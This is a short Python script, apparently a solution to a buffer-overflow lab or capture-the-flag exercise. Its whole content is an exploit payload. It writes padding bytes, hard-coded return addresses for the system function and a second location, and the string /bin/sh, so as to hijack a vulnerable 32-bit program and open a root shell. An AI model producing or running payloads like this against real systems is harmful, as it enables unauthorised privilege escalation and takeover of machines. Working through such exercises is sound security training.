# sol5.py prints 22 A's, the address of the system function, the address of the shellcode and /bin/sh to overflow the buffer and open a root shell
import sys
sys.stdout.buffer.write(b'A'*22 + b'\x72' + b'\x9b' + b'\x04' + b'\x08' + b'\x74' + b'\xa7' + b'\xfe' + b'\xbf' + b"/bin/sh")
